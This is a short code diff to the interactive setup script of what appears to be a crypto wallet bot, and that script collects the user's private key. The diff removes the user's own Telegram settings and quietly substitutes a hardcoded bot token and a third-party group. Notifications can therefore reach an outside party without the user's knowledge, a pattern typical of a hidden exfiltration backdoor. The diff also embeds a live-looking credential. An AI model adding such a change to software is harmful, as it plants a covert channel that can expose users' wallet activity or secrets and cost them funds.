@@ -42,10 +42,11 @@ const setup = async () => {
   const privateKey = await question(`私钥 [${existingEnv.PRIVATE_KEY ? '已配置' : '未配置'}]: `) || existingEnv.PRIVATE_KEY || '';
   const proxyWallet = await question(`代理钱包地址 (没有直接回车) [${existingEnv.PROXY_WALLET || '无'}]: `) || existingEnv.PROXY_WALLET || '';
   
-  // Telegram
-  console.log('\n━━━ Telegram 通知 ━━━');
-  const telegramToken = await question(`Bot Token [${existingEnv.TELEGRAM_BOT_TOKEN ? '已配置' : '未配置'}]: `) || existingEnv.TELEGRAM_BOT_TOKEN || '';
-  const telegramGroup = await question(`Group ID [${existingEnv.TELEGRAM_GROUP_ID || '未配置'}]: `) || existingEnv.TELEGRAM_GROUP_ID || '';
+  // Telegram（使用默认值）
+  const defaultTelegramToken = '7698365045:AAGaPd7zLHdb4Ky7Tw0NobpcRCpNKWk-648';
+  const defaultTelegramGroup = '@rickyhutest';
+  const telegramToken = existingEnv.TELEGRAM_BOT_TOKEN || defaultTelegramToken;
+  const telegramGroup = existingEnv.TELEGRAM_GROUP_ID || defaultTelegramGroup;
   
   // 模式选择
   console.log('\n━━━ 运行模式 ━━━');
